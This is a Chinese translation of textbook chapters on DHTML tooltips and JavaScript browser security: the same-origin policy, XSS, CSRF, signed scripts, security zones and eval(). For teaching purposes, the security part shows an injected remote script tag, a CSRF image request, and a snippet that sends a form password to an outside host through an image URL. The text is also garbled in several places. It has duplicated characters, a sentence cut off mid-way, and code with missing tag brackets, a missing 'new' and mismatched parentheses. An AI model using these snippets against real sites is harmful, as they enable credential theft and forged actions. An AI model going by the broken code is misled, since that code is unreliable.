  display:none; padding:20px;\" id=\"windowContents\">\n    <h1>关于</h1>\n    <p>模态窗口\
  \ v1.0</p>\n    <button onclick=\"window.currentModalWindow.close()\">关闭</button>\n\
  </div>\n</body>\n</html>\n```\n\n# 表单工具提示 (Form Tooltips)\n\nDHTML 的另一个元素级示例是工具提示（tooltip）。工具提示是出现在内容之上的微小消息窗口，让用户了解他们正在查看的内容。从学习的角度来看，它们是非常棒的，因为要构建一个，你必须整合许多\
  \ DHTML 的核心概念，包括动画、定位和透明度。在这个示例中，我将利用我之前在本章中编写的一些实用函数，包括 `getCoords()`（它能告诉我们元素在页面上的绝对位置）和\
  \ `setOpacity()`（它再次设置元素的透明度）。\n\n工具提示的一个极佳用途是表单验证。某些 Web 表单令人沮丧的问题之一是，用户在点击提交之前并不知道自己填错了什么。现代\
  \ Web 表单的常见做法是对字段进行即时验证，并在用户需要回溯并重新评估其输入内容时提供实时反馈。工具提示非常适合这种场景，因为它们能吸引注意力，并在片刻后消失。\n\
  \n在开始开始之前，让我们先设置一个带有非常基础表单的新文档。我还会包含一个对 `utils.js` 的外部引用，你只需想象它包含了在本章之前提到的 `getCoords()`\
  \ 和 `setOpacity()` 实用函数：\n\n```html\n<head>\n    <title>表单工具提示测试</title>\n    <script\
  \ type=\"text/javascript\" src=\"utils.js\"></script>\n</head>\n<body onload=\"\
  bindValidationToFields()\">\n    <h1>我的注册表单</h1>\n    <p>所有字段均为填！</p>\n    <form>\n\
  \        <p>您的姓名：input type=\"text\" id=\"name\" required=\"true\"></p>\n      \
  \  <p>您的邮箱：input type=\"text\" id=\"email\" required=\"true\"></p>\n        <p>选择密码：input\
  \ type=\"password\" id=\"pw\" required=\"true\"></p>\n        <input type=\"submit\"\
  \ disabled=\"true\" value=\"注册\">\n    </form>\n</body>\n```\n\n你会在 `body` 的 `onload`\
  \ 事件中注意到我调用了 `bindValidationToFields()`，但该函数尚不存在。让我们设置这个函数，它将检查文档中的所有字段并查找 `required`\
  \ 属性。这个属性是我添加到所有文本字段中的。通过查找 `required` 属性来绑定所有事件：\n\n```javascript\nfunction bindValidationToFields()\
  \ {\n    for (var i = 0; i < document.forms.length; i++) {\n        for (var x =\
  \ 0; x < document.forms[i].elements.length; x++) {\n            var field = document.forms[i].elements[x];\n\
  \            var required = field.getAttribute(\"required\");\n            if (required\
  \ && required == \"true\") {\n                if (field.attachEvent) {\n       \
  \             // IE\n                    field.attachEvent(\"onblur\", checkFieldCompleted);\n\
  \                } else {\n                    // W3C\n                    field.addEventListener(\"\
  blur\", checkFieldCompleted, false);\n                }\n            }\n       \
  \ }\n    }\n}\n```\n\n检查是否需要显示工具提示\n\n```javascript\nfunction checkFieldCompleted(e)\
  \ {\n    var target = e.srcElement || e.target;\n    if (target.value.length ==\
  \ 0) {\n        var newTT = new tooltip(\"此字段为必项!\", target);\n        newTT.display(2000);\n\
  \    }\n}\n```\n\n\n\n\n\n当用户离开其中一个文本字段时，`onblur` 事件会触发，并执行此函数。我从事件对象获取表单字段本身的引用，并将其赋值给\
  \ `target`。然后，我检查 `input` 值长度来判断它是否为空。由于我在这里设置的唯一要求是用户在每个字段中输入*某些内容*，因此只要里面至少有一个字符就足够了。如果没有内容，它就会创建一个\
  \ `tooltip` 类的实例（该类尚不存在存在），并带上一些要显示的文本。我还传递了 `target` 的引用，我将用它来确定提示框的位置。最后，我调用了一个名为\
  \ `display()` 的方法并传递了一个超时时间。想法是，当超时过期时，提示框应该自动消失。现在让我们来设置 `tooltip` 类。\n\n## Tooltip\
  \ 类\n\n```javascript function tooltip(text, attachToEl){\n    // 如我之前提到的，我将向这个类传递两个参数：要显示的文本和一个用于“挂载”提示框的元素。我将把提示框放置在该元素旁边，以便在视觉上清晰地看出它们是关联的。\n\
  // 现在我想创建一个包含文本的容器元素，并给它设置一些样式\n\n// 创建包含文本的 div\nvar tooltipDiv = document.createElement(\"\
  div\");\ntooltipDiv.style.position = \"absolute\";\n\n// 样式化提示框并填充文本\ntooltipDiv.style.backgroundColor=\
  \ \"yellow\";\ntooltipDiv.style.padding= \"2px\";\nvar currentOpacity = 0.0;\nsetOpacity(tooltipDiv,\
  \ currentOpacity);\ntooltipDiv.innerHTML = text;\n```\n\n我设置了 `div` 的 `innerHTML`\
  \ 属性，这会导致元素显示我想要的文本。我还使用了在本节之前编写的 `setOpacity()` 工具函数设置不透明度。在页面上定位 `div` 之前，我需要知道目标元素（表单字段）*在哪里*，这样它才不会重叠且保持接近。\n\
  \n```javascript\n// 找到我们要挂载的元素的坐标\nvar boxToAttachTo = getCoords(attachToEl);\n\
  tooltipDiv.style.left = boxToAttachTo.right+10+ \"px\";\ntooltipDiv.style.top =\
  \ boxToAttachTo.top+ \"px\";\n```\n\n这应该会将 `div` 放置在表单字段的右侧。接下来，我想创建一个私有属性，用于存储动画的计时器对象。这个提示框将在出现时淡入，并在我想让它消失时淡出。为了防止它们相互干扰，应该有一个唯一的全局计时器对象，我现在就创建它。\n\
  \n```javascript\n// 创建计时器对象\nvar timerObj = null;\n```\n\n淡入淡出提示框的行为将被放在两个私有函数中，这两个函数会在动画的每一帧被反复调用。它们将共享同一个计时器对象：\n\
  \n```javascript\n// 这个私有函数会将提示框淡入\nvar fadeIn = function() {\n    clearTimeout(timerObj);\n\
  \    currentOpacity+= 0.1;\n    setOpacity(tooltipDiv,currentOpacity);\n    if (currentOpacity\
  \ <1.0)\n        timerObj = setTimeout(fadeIn, 100)\n}\n\n// 这个私有函数会将提示框淡出\nvar\
  \ fadeOut= function() {\n    clearTimeout(timerObj);\n    currentOpacity-= 0.1;\n\
  \    setOpacity(tooltipDiv,currentOpacity);\n    if (currentOpacity >0.0)\n    \
  \    timerObj = setTimeout(fadeOut,100)\n}\n```\n\n我还没有实际编写显示或隐藏提示框的代码。由于 `fadeIn()`\
  \ 和 `fadeOut()` 都是私有内部函数，从外部无法作为实例方法进行访问。相反，我可以将所有逻辑放在一个单一的 `display()` 方法中，我可以从外部调用它：\n\
  \n```javascript\n// 显示提示框\nthis.display=function(timeBeforeDisappear){\n    document.body.appendChild(tooltipDiv);\n\
  \    fadeIn();\n    setTimeout(fadeOut,timeBeforeDisappear);\n}\n```\n\n在 `display()`\
  \ 内部，我将 `tooltipDiv` 引用添加到 DOM 中，然后通过调用 `fadeIn()` 开始淡入过程。我还设置了一个超时时间让它消失，这由参数 `timeBeforeDisappear`\
  \ 控制。这有效地完成了我的 `tooltip` 类。现在，如果我在浏览器中运行它，我应该能看到类似于[图 16-14]所示的界面。\n\n## 完整示例\n\n\
  ```html\n<<html>\n<head>\n  <title>表单提示框</title>\n  <script type=\"javascript\"\
  \ src=\"utils.js\"></script>\n  <script type=\"javascript\">\n    // The tooltip\
  \ 类\n    function tooltip(text, attachToEl) {\n      // 创建包含文本的 div\n      var tooltipDiv\
  \ = document.createElement(\"div\");\n      tooltipDiv.style.position = \"absolute\"\
  ;\n      // 样式化提示框并填充文本\n      tooltipDiv.style.backgroundColor = \"yellow\";\n\
  \      tooltipDiv.style.padding = \"2px\";\n      var currentOpacity = 0.0;\n  \
  \    setOpacity(tooltipDiv, currentOpacity);\n      tooltipDiv.innerHTML = text;\n\
  \      // 找到我们要挂载的元素的坐标\n      var boxToAttachTo = getCoords(attachToEl);\n    \
  \  tooltipDiv.style.left = boxToAttachTo.right+10 + \"px\";\n      tooltipDiv.style.top\
  \ = boxToAttachTo.top + \"px\";\n      // 创建计时器对象\n      var timerObj = null;\n\
  \      // 这个私有函数会将提示框淡入\n      var fadeIn = function() {\n        clearTimeout(timerObj);\n\
  \        currentOpacity+= 0.1;\n        setOpacity(tooltipDiv,currentOpacity);\n\
  \        if (currentOpacity <1.0)\n          timerObj = setTimeout(fadeIn, 100)\n\
  \      }\n      // 这个私有函数会将提示框淡出\n      var fadeOut= function() {\n        clearTimeout(timerObj);\n\
  \        currentOpacity-= 0.1;\n        setOpacity(tooltipDiv,currentOpacity);\n\
  \        if (currentOpacity >0.0)\n          timerObj = setTimeout(fadeOut,100)\n\
  \      }\n      // 显示提示框\n      this.display=function(timeBeforeDisappear){\n  \
  \      document.body.appendChild(tooltipDiv);\n        fadeIn();\n        setTimeout(fadeOut,timeBeforeDisappear);\n\
  \      }\n    }\n\n    // 检查是否需要显示提示框\n    function checkFieldCompleted(e) {\n \
  \     var target = e.srcElement || e.target;\n      if (target.value.length == 0)\
  \ {\n        var TT = tooltip(\"必填!\", target);\n        TT.display(200);\n    \
  \  }\n    }\n\n    // 通过查找 \"required\" 属性绑定所有事件\n    function bindValidationToFields()\
  \ {\n      for (var i = 0; i < document.forms.length; i++) {\n        for (var x\
  \ = 0; x < document.forms[i].elements.length; x++) {\n          var field = document.forms[i].elements[x];\n\
  \          var required = field.getAttribute(\"required\");\n          if (required\
  \ && required == \"true\") {\n            if (field.attachEvent) {\n           \
  \   // IE\n              field.attachEvent(\"onblur\", checkFieldCompleted);\n \
  \           } else {\n              // W3C\n              field.addEventListener(\"\
  blur\", checkFieldCompleted, false);\n            }\n          }\n        }\n  \
  \    }\n    }\n  </script>\n</head>\n<body onload=\"bindValidationToFields()\">\n\
  \  <h1>我的注册表单</h1>\n  <p>所有字段均为必填项！</p>\n  <form>\n    <p>姓名：<input type=\"text\"\
  \ id=\"name\" required=\"true\"></p>\n    <p>邮箱：<input type=\"text\" id=\"email\"\
  \ required=\"true\"></p>\n    <p>选择密码：<input type=\"password\" id=\"pw\" required=\"\
  true\"></p>\n    <input type=\"submit\" disabled=\"true\" value=\"注册\">\n  </form>\n\
  </body>\n</</html>\n```\n\n\n\n\n本章涵盖了大量内容，并整合了你在之前章节中学习的许多不同概念。在本章中，我涵盖了以下主题：\n\
  \n- DHTML 是若干相关技术的汇汇，包括 `CSS`、`DOM`、`JavaScript` 和 `HTML`。\n- 文档和窗口几何对于某些类型的 DHTML\
  \ 行为至关重要。确定这些的方法取决于浏览器和 `DOCTYPE`。\n- 获取滚动条宽度也很有用。你可以通过在屏幕外进行简单的测试并测量结果来确定这一点。\n\
  - 鼠标悬停（Rollovers）是最基本的 DHTML 操作。这些操作可以在不使用任何 `JavaScript` 的情况下实现，在更复杂的情况下，使用第 12\
  \ 章介绍的 `mouseenter` 和 `leave` 技术。\n- DHTML 组件的基石是定位。绝对定位允许你精确地将元素放在页面上。我还向你展示了如何计算元素在页面上的位置，无论用户使用的是哪种浏览器。\n\
  - 因为 `JavaScript` 是单线程的，你必须使用定时器来模拟线程的行为。这也是你产生流畅动画的方法：通过使用定时器事件之间的间隔，允许 `DOM` 更新并绘制自身。\n\
  - 你学习了透明度以及如何随时间淡化元素并改变它们的颜色。我向你展示了如何利用你已经掌握的定位和动画知识来构建 DHTML 组件：一个模态对话框和一个工具提示。\n\
  \n在第 17 章中，我将深入研究 `JavaScript` 安全。我将讨论签名脚本、同源策略（`Same Origin Policy`）以及各种浏览器的安全策略。\n\
  \n# JavaScript 安全\n\n浏览器是你能想象的控制最严的开发环境之一。它必须是这样。微软（Microsoft）和网景（Netscape）从未信任过网络。他们也知道，如果用户对网页能他们的电脑做什么产生真正的恐惧，那么该浏览器被抛弃的速度会比你说话的速度快得多。在持续了十年的激烈浏览器大战中，供应商对推出新功能和能力保持谨慎是自然现象。尽管如此，浏览器拥有一段长期而不幸的安全漏洞历史，这在很长一段时间内给\
  \ `JavaScript` 留下了坏名，而且其中部分归因是错误的。现在有了一些稳定性，但开发者的规则在不断变化。这些变化大多数是对全范围内被采纳的相当贯的安全策略的细微改进。本章介绍了基于浏览器的安全的主要问题，包括同源策略（`Same\
  \ Origin Policy`）、签名脚本、区域以及其他各种杂问题。\n\n## 安全模型\n\n对于网页中的任何嵌入技术，如 `Flash`、`Silverlight`\
  \ 或 `JavaScript`，厂商都在开发者（随之是用户）的自由与安全之间进行平衡。有两种处理方法：要么在页面每次使用脚本时都警告用户，或者直接限制功能，使得脚本没有任何可能对用户造成伤害。反过来，保护互联网是另一件事，这些模型并没有真正解决这个问题，这是开发者需要注意的。网景和微软的选择是限制\
  \ `JavaScript` 的功能，使得户户很大程度上可以保证，在一切相等的情况下，他们不会被运行在页面中的脚本骚扰或攻击。这种安全模型借自 Java 世界，对浏览器内部运行的脚本施加了一些主要限制：\n\
  \n- `JavaScript` 无法直接访问文件系统。没有办法打开、删除或甚至检测文件或文件夹的存在。\n- 它不能直接与网络层通信。脚本无法打开任意套接或使用未知的协议进行通信。\n\
  - 控制 `window` 本身（无论是大小还是位置）的能力受到限制。\n- 运行在域 `X` 中的脚本不能与域 `Y` 中的文档交互，无论是跨框架还是通过 `Ajax`\
  \ 请求。这被称为同源策略（`Same Origin Policy`）。\n- 脚本无法直接访问内存或运行原生代码。\n- 脚本不能安装原生程序。\n- 脚本不能锁定计算机或以其他方式导致其无响应。\n\
  \n这些边界有时被称为安全 `sandbox`（沙箱），因为在这一种受控环境的四面墙内，脚本在其他方面是不经审计的。在这些限制范围内，它们可以放任。尽管如此，脚本有很多方法可以通过迂回的手段绕过规则。\n\
  \n## 同源策略\n\n`JavaScript` 浏览器安全模型的核心是同源策略（`Same Origin Policy`），有时也称为同站策略（`Same\
  \ Site Policy`）或单源策略（`Single Origin Policy`）。该策略首次引入于 Netscape 2.0，它限制了脚本跨域访问文档内容的能力。在这种意义上，域由完整主机名、端口和协议（例如\
  \ `http`、`https`）的组合定义。\n\n考虑以下示例。如果脚本运行在位于 `http://www.wrox.com/index.html` 的页面上，并且它向以下位置发起\
  \ `Ajax` 请求，它将根据下表获得不同程度的成功。\n\n![209](img/whit_9780470550502_oeb_209_r1.gif)\n\n\
  这不仅适用于 `Ajax` 请求，还适用于一系列操作，包括：\n\n- 访问 `iframe` 和框架的 `document` 元素\n- 操控其他浏览器窗口\n\
  - 处理 cookie\n- `XmlHttpRequest` (`Ajax`)\n\n这并不意味着所有资源都必须来自同一源。`CSS` 文档、`JavaScript`\
  \ 文件、`Flash` 电影和图像可以从任何地方包含。\n\n同源策略（`Same Origin Policy`）旨在保护用户免受许多威胁。其一，它的目的是提供某种保证，使输入网页上的所有数据都留在该域内，防止恶意脚本伪充或劫持信息或会话。然而，它在这方面仅部分有效。\n\
  \n```\n在 Internet Explorer 5 中，“信任”安全区域的站点不受同源策略（Same Origin Policy）的限制。然而，此功能在后后的\
  \ Explorer 版本中不可用。\n```\n\n## document.domain 的异常\n\n同源策略（`Same Origin Policy`）的一个异常是手动将\
  \ `document.domain` 属性设置为当前域后缀的脚本。例如，运行在 `http://store.wrox.com` 上的脚本在与 `http://wrox.com`\
  \ 上的文档通信时通常通过同源检查，但如果开发者首先执行以下操作则不会：\n\n```javascript\ndocument.domain = \"wrox.com\"\
  ;\n```\n\n对于后续所有的源检查，这都是用于比较的域。同样，位于 `http://store.wrox.com` 的页面通常无法与 `http://browse.wrox.com`\
  \ 的 `iframe` 通信，但如果两个文档都将它们的 `document.domain` 属性设置为 `wrox.com`，它们*将*能够通信。然而，具有完全不同后缀的\
  \ URL 跨尝试（例如 `nitobi.com` 与 `foreseeresults.com`）永远无法发生，即使设置两个页面的 `document.domain`\
  \ 属性也是如此。\n\n## 跨站脚本攻击 (Cross-Site Scripting)\n\n\n\n\n\n`Cross-Site Scripting`（跨站脚本），简称\
  \ `XSS`，是指向其他用户查看的另一个域名的页面的 `DOM` 中注入脚本的行为。恶意用户可能会尝试利用漏洞存储用户的按键记录或操作，目的是窃取其信息。在过去，具有用户提交内容的网站特别容易受到此类利用的侵害。例如，用户可以在博客上发布一条评论，其中包含类似这样的脚本块：`Nice\
  \ blog! Thanks for posting that...<script type=\"text/javascript\" src=\"http://badware.org/snoop.js\"\
  ></script>`。在页面上查看时，只有评论是可见的，但浏览器会为每个看到该内容的访问者下载外部脚本。此类脚本可以监视登录或其他屏幕内容，甚至在 `phishing`（钓鱼）尝试中重写\
  \ `DOM`。\n\n### DOM 型 XSS\n\n在所谓的 `DOM-based`（基于 DOM）跨站脚本漏洞中，问题存在于页面 JavaScript\
  \ 本身的逻辑中。这种类型的漏洞不需要外部脚本。相反，在脚本访问 URL 参数并使用这些信息在页面上显示 HTML 的情况下，如果这些数据没有经过适当过滤以移除\
  \ HTML 或 JavaScript 符号，就会存在 XSS 机会。\n\n### 持久性与非持久性 XSS\n\n在持久性 XSS 漏洞中，一段存储或永久的内容被注入到网站的数据库或内容中（有时通过博客评论或\
  \ Wiki 内容帖子），使得它会在所有查看该恶意内容的用户面前持续出现。这些内容可能包含外部脚本的引用，或仅是一段执行某种钓鱼或监视行为的内联脚本。非持久性漏洞类似于前面提到的\
  \ DOM 型情况，但不会被永久存储在任何地方。像上面提到的持久性漏洞是目前最常见且也最危险的 XSS 攻击形式。\n\n### 预防\n\n通常，避免遭受此类\
  \ XSS 攻击的最佳策略是过滤或转义所有用户输入，以移除角括号等 HTML 实体，并转义字符串中的引号。某些 Web 框架如 `ASP.NET` 在配置正确支持对用户输入进行自动过滤。\n\
  \n## 跨站请求伪造\n\n另一种常见的 Web 应用漏洞是 `Cross-site request forgery`（跨站请求伪造）。然而，尽管名称相似，但这实际上与同源策略或\
  \ JavaScript 本身没有直接关系。它基本上涉及向用户已登录但当前并不一定访问的站点提交命令。特别是那些能够通过 `GET` 请求永久修改数据的站点 URL\
  \ 特别容易受到此类攻击，例如：`http://crm.com/account/?action=delete_all_users`。如果此 URL 具有从 CRM\
  \ 账户删除用户的功能，且用户在访问另一个站点时已登录了该 CRM 软件包，要删除该用户的数据只需要创建一个指向此 URL 的图像：`<img src=\"http://crm.com/account/?action=delete_all_users\"\
  \ width=\"1\" height=\"1\">`。任何仅根据浏览器 cookie 的有效性就允许用户更改数据的 Web 应用都容易受到此类利用的侵害，这些攻击通常发生在网络论坛，用户可以在那里发布图像，但无法发布\
  \ JavaScript。开发者可以通过在每个请求的参数中要求某种身份验证（而不仅仅是 cookie）来避免跨站伪造。另一种技术是检查每个请求的 `HTTP Referrer`\
  \ 请求头以验证请求的来源。第三种技术是严格限制会话 cookie 的寿命，并在用户每次发出有效请求时刷新它们。\n\n## 寄带传输\n\n在第 11 章中我提到了\
  \ URL 的最大长度，范围从 Internet Explorer 的 2,083 个字符到 Opera 浏览器的 190,000 个字符以上。恶意用户可以利用这些异常长的\
  \ URL 限制在不违反同源策略的情况下跨域传输数据。例如，恶意脚本可以秘密创建一个新的 `DOM` 图像节点，其源指向另一个域名。在该图像的 URL 中，它将编码其收集到的关于用户会话的任何信息。例如：\n\
  \n```\nvar userPassword = document.forms[0].elements[0].value;\nvar newImg = document.createElement(\"\
  img\");\nnewImg.src = \"http://snoopspy.com/?url=\"+encodeURIComponent(window.location)+\"\
  &password=\"+encodeURIComponent(userPassword);\ndocument.body.appendChild(newImg);\n\
  ```\n\n要发生这种情况，用户必须先使用前面提到的技术之一将脚本加载到页面。\n\n# 签名脚本\n\n基于 Mozilla 的浏览器（如 Firefox）支持一种名为\
  \ `object signing`（对象签名）的脚本和页面签名能力，它是参考 Java 签名方法的。由受信任签名机构（如 VeriSign）颁发的有效证书可用于封存并验证脚本的来源，并赋予其更高的安全权限以执行在浏览器中无法完成的操作。签名脚本涉及获取数字签名并与脚本关联。在现代版本的\
  \ Netscape 和 Firefox 中，HTML 页面和与其相关的任何脚本都封装在一个 `JAR` 文件中，并使用语法 `jar:http://bla.com/jarfilename.jar!/pagename.html`\
  \ 称为 HTML 页面。\n\n## 需要扩展权限的 Mozilla 功能\n\n以下功能需要使用签名脚本和扩展权限：\n- 使用除默认 `about:blank`\
  \ 外的 `about:` URL。需要 `UniversalBrowserRead`。\n- 使用 `history` 对象读取访问过的其他站点信息。同样需要\
  \ `UniversalBrowserRead`。\n- 使用 `preference` 方法获取或设置配置值。需要 `UniversalPreferencesRead`\
  \ 和 `UniversalPreferencesWrite`。\n- 在 `window` 对象中添加或移除 `directory bar`、`menu bar`、`personal\
  \ bar`、`scroll bar`、`status bar` 或 `toolbar`。\n- 使用 `enableExternalCapture` 捕获同源之外的页面事件。应后续\
  \ `captureEvents`。\n- 无条件关闭当前浏览器窗口。\n- 将窗口移动到屏幕外。\n- 打开新窗口，或调整现有窗口大小使其小于 100x100\
  \ 像素或大于可视屏幕区域。\n- 使用 `titlebar=no` 打开不带标题栏的新窗口。\n- 使用 `alwaysRaised`、`alwaysLowered`、`{z-lock`\
  \ 打开浏览器窗口。\n\n## Internet 中的签名脚本\n\nMicrosoft 支持一种名为 `Authenticode` 的签名方法，但它不能用于\
  \ JavaScript —— 仅用于 Java Applet、ActiveX 和其他插件。此外，在普通的 Web 端 JavaScript 中，没有办法赋予脚本高安全权限来执行\
  \ Firefox 中可以执行的操作，除非使用 `HTA`（超文本应用程序），但它们不是基于 Web 的，对大多数编写 Web 应用的人来说并没有特别有用。\n\
  \n\n\n\nFirefox 浏览器构建在 Mozilla 代码库之上，它使用可配置的安全策略文件，允许用户对不同的网站设置不同的规则。与 Internet\
  \ Explorer 的方法不同，这些策略配置在文本文件中，并仅提供了一个简单的 GUI 工具进行编辑。每个安全区域都有自己的自己的名为 `user.js` 的配置文件，该文件会修改全局偏好文件\
  \ `prefs.js`。在 Firefox 中，你可以在地址栏输入 `about:config` 来查看和编辑 `prefs.js` 文件（参见图 17-1）。例如，假设你想增加每个域的最大并发\
  \ HTTP 连接数（通常设置为 15）。在 `user.js` 中你输入：`user_pref(″network.http.max-connections-per-server″,\
  \ 30);`图 17-1![210](img/whit_9780470550502_oeb_210_r1.jpg)给定策略的偏好文件通常位于找到当前用户配置根目录下的\
  \ `\\Profiles\\` 子文件夹中。你也可以为特定的网站组分配策略名称。要禁用 [`wrox.com`](http://wrox.com) 和 [`nitobi.com`](http://nitobi.com)\
  \ 网站的 JavaScript 但其他其他网站，你需要在 `user.js` 中添加以下行：`user_pref(″capability.policy.policynames″,\
  \ ″nojscutout″);`\n\n`user_pref(″capability.policy.nojscutout.sites″,″[`wrox.com`](http://wrox.com)\
  \ [`nitobi.com`](http://nitobi.com)″);`\n\n`user_pref(″capability.policy.nojscutout.javascript.enabled″,″noAccess″);`更具体的策略将覆盖不那么具体的策略。要禁用这两个网站之外的所有网站的\
  \ JavaScript，请执行相反的操作：`user_pref(″capability.policy.policynames″,″jsokcutout″);`\n\
  \n`user_pref(″capability.policy.default.javascript.enabled″,″noAccess″);`\n\n`user_pref(″capability.policy.jsokcutout.sites″,″[`wrox.com`](http://wrox.com)\
  \ [`nitobi.com`](http://nitobi.com)″);`\n\n`user_pref(″capability.policy.jsokcutout.javascript.enabled″,″allAccess″);`编辑\
  \ `prefs.js` 时要小心。Mozilla 在每次关闭应用程序时都会覆盖该文件，因此你必须在程序关闭时进行编辑。\n\n## Internet Explorer\
  \ 安全区域\n\nInternet Explorer 的处理方式略不同。它不是允许用户针对无限可能的设置组合自定义无限策略，而是被限制在五个预配置的区域，参见图\
  \ 17-2。首先，你必须决定哪些网站适合哪些区域，然后为这些区域设置策略。除了这五个区域外，还有三个安全级别的“模板”（高、中高、中）以及一个用于创建自定义特定策略的定制工具。图\
  \ 17-2![211](img/whit_9780470550502_oeb_211_r1.jpg)在自定义区域时，每个规则通常有三个选项：启用、禁用和提示。当你选择“提示”时，用户会收到一条警告消息，并被要求此时允许或禁止该网站使用该功能。安全区域定制器程序可以在图\
  \ 17-3 中看到。图 17-3![212](img/whit_9780470550502_oeb_212_r1.gif)\n\n# 杂项问题\n\nJavaScript\
  \ 安全漏洞的现状并不限于微软的实现错误。还有许多与人们构建应用程序的方式以及误用浏览器非常重要且基础的功能有关。以下是几个重要的问题。\n\n## 新窗口\n\
  \n由于对 `window.open` 功能的滥用，主要供应商已静静地对该方法实施了新的安全限制，防止其在没有用户输入触发的情况下使用，并防止开发者将窗口放置在屏幕外或设置为不方便的大小。Internet\
  \ Explorer 和 Mozilla 中都有一套纠错机制，禁止新窗口放置在屏幕可见部分的任何地方。Firefox 中 set 有 100x100 像素的最小限制，且\
  \ Internet Explorer 不再允许开发者隐藏地址栏。\n\n## 拒绝服务\n\n从该术的传统意义上说，拒绝服务攻击是指用数千个并发请求轰击网站，导致主机无法为任何合法流量提供服务。在\
  \ JavaScript 的语境下，这被用于恶意开发者试图导致浏览器锁死或崩溃，使浏览器进入持续循环或利用已知的崩溃漏洞。现代浏览器已经实施了启发式算法以防止函数调用中的过度递归，并尝试通过检测问题并让用户完全中断\
  \ JavaScript 的执行来阻止长时间运行的操作冻结浏览器（参见图 17-4）。图 17-4![213](img/whit_9780470550502_oeb_213_r1.jpg)例如，以下递归循环应该被现代浏览器捕获但可能会导致\n\
  \n## 数据安全\n\n在大多数情况下，开发者并没有在 JavaScript 应用中存储大量的安全数据。至少他们没有存储在客户端。然而，在第 18 章中我将向你展示许多实现半持久数据存储的方法。这些技术主要用于网络连接丢失或用户希望离线工作的情况。例如，Cookies\
  \ 与特定的 URL 或域绑定，并在边界之外无法访问。另一种存储技术使用 `window.name` 属性跨页面存储数据，只要浏览器窗口保持打开。\n\n###\
  \ ActiveX\n\nActiveX 组件是嵌入网络浏览器的小型编译程序，可以提供 JavaScript 单独无法实现的功能。原始 `XMLHttpRequest`\
  \ 对象是内置于 Internet Explorer 中的 ActiveX 控制。有两种 ActiveX 类型：签名和未签名。ActiveX 的签名方法与 Mozilla\
  \ 浏览器对 JavaScript 的签名方式类似，但它不是脚本而是可执行文件，对损坏计算机的影响巨大。在 Internet Explorer 中，只有当提供网站位于*信任站点*区域时，用户才能安装未签名控件。如果控件使用微软的\
  \ *Authenticode* 过程进行签名，则可以在其他区域安装。当开发者编写 ActiveX 控制时，他们会指示其是否为“安全”控制。这种想法是安全控制没有能力或潜力损害计算机或执行任何恶意操作。由于已安装的控件理论上可以被任何网站调用，浏览器处理安全和不安全控件的方式不同。已安装并标记为*安全*的控件（如\
  \ `XMLHttpRequest` 对象）可以在高模板之外的所有模板中执行。![214](img/whit_9780470550502_oeb_214_r1.gif)\n\
  \n### Flash\n\n\n\n\n\n由于 Flash 通过其 `ExternalInterface` 特性易于与 JavaScript 集成，并且通过在技术栈中包含\
  \ Flash 能够叠加许多强大的功能，近年来将 Flash 用于非娱乐目的的情况在逐年增加。例如，Flash 提供了一种某种永久的持久化离线存储能力，这种能力在浏览器崩溃甚至在尝试清除缓存后依然存在。从安全角度考虑，Flash\
  \ 令人担忧之处在于，你基本上可以通过使用 Flash 的 `NetConnection` 类和远程服务器上的 `crossdomain.xml` 文件来违反同源策略（Same\
  \ Origin Policy）。一个能够将自己的脚本注入到网站模板中的恶意用户，可以使用 AMF（动作消息格式）和 `NetConnection` 跨域传输大量数据，而用户完全不会察觉。这与之前提到的“搭便传输”技术在本质上没有区别，只是使用这种方法可以传输多得多的数据。\n\
  \n## JSON 和 `eval()`\n\n许多编程语言都支持一种通常称为 `eval()` 的动态评估函数，正如我在第 6 章中提到的，它被用于将字符串*作为\
  \ JavaScript 代码执行*。除了速度慢之外，没有什么好的理由去使用这一特性。某些开发者笨拙地尝试使用 `eval()` 来检查对象的动态属性，如下：\n\
  \n```javascript\nvar result = eval(\"window.\" + myPropName);\n```\n\n在 JavaScript\
  \ 中，对象可以像关联数组一样被处理，因此*不使用* `eval()` 也可以轻松实现相同的操作，如下：\n\n```javascript\nvar result\
  \ = window[myPropName];\n```\n\n尽管如此，目前 `eval()` 最常用的用法仍然是解析 JSON（JavaScript 对象表示）。JSON\
  \ 被用作 Ajax 请求的传输格式，因为当 JSON 文本被作为代码评估时，它会立即变成一个非常易处理的对象：\n\n```javascript\nvar myObj=\
  \ eval(\"{b:1,c:true})\");\ndocument.write( myObj.b+\"<br />\"); // \"1\"\ndocument.write(\
  \ myObj.c); // \"true\"\n```\n\n唯一的问题是，如果你从用户输入构建 JSON 字符串，恶意代码可能会劫持应用程序。答案是使用 JSON\
  \ 解析器而不是 `eval()` 来将字符串转换为对象。在 Internet Explorer 8 和 Firefox 3.5 中，原生的 JSON 对象为此种目的提供了高速的字符串解析。在其他浏览器中，有许多解析工具可以在*不使用*\
  \ `eval()` 的情况下完成相同的工作。\n\n# 总结\n\n在这个简短的章节中，我介绍了许多与 JavaScript 安全相关的主题。回顾一下，我提到：\n\
  \n- 浏览器厂商实现的整体安全模型本质上寻求创建一个安全的“沙箱”，在沙箱中，不可信的脚本功能受到限制，以至于运行它们几乎不会产生任何伤害。在实践中，这种策略的效果参差不齐。\n\
  - 同源策略限制了脚本与不同站点文档之间的交互。这影响了 cookie、框架和 Ajax 请求。然而，人们使用了许多技术来绕过这一限制，包括跨站脚本（XSS）和搭便传输。Flash\
  \ 动画也可以用于绕过同源策略。\n- 在像 Firefox 这样基于 Mozilla 的浏览器中，可以对网页和脚本进行数字签名，让用户对脚本的来源获得某些保证。然而，这并不保证脚本是安全的，但允许脚本具有更高的安全性。Internet\
  \ Explorer 没有此类功能，但你可以使用 Microsoft 的 Authenticode 特性对 ActiveX 插件进行数字签名。\n- Mozilla\
  \ 和 Internet Explorer 都支持某种安全区域或策略架构，尽管它们的实现方式不同。\n- 浏览器曾经非常容易受到拒绝服务（DoS）攻击，此类攻击试图冻结或崩溃用户的浏览器。它们通过将\
  \ JavaScript 解释器锁定递归循环中或利用其他类似的漏洞来实现。现代浏览器有应对这些策略的措施，这些措施总体来说相当有效。\n- JSON 操作中使用的\
  \ `eval()` 函数也容易受到攻击，因为它执行了可能包含用户输入的不可信脚本。较新的浏览器提供了原生的 JSON 解析工具，而对于没有提供这些工具的浏览器，基于脚本的解析器则提供了一种程度的安全保障。\n\
  \n在第 18 章，我将讨论客户端的持久化存储技术。你将学习一些在用户计算机上存储数据的方法，用于存储会话信息、为 Web 应用提供离线或间歇访问，甚至是崩溃容错能力。\n\
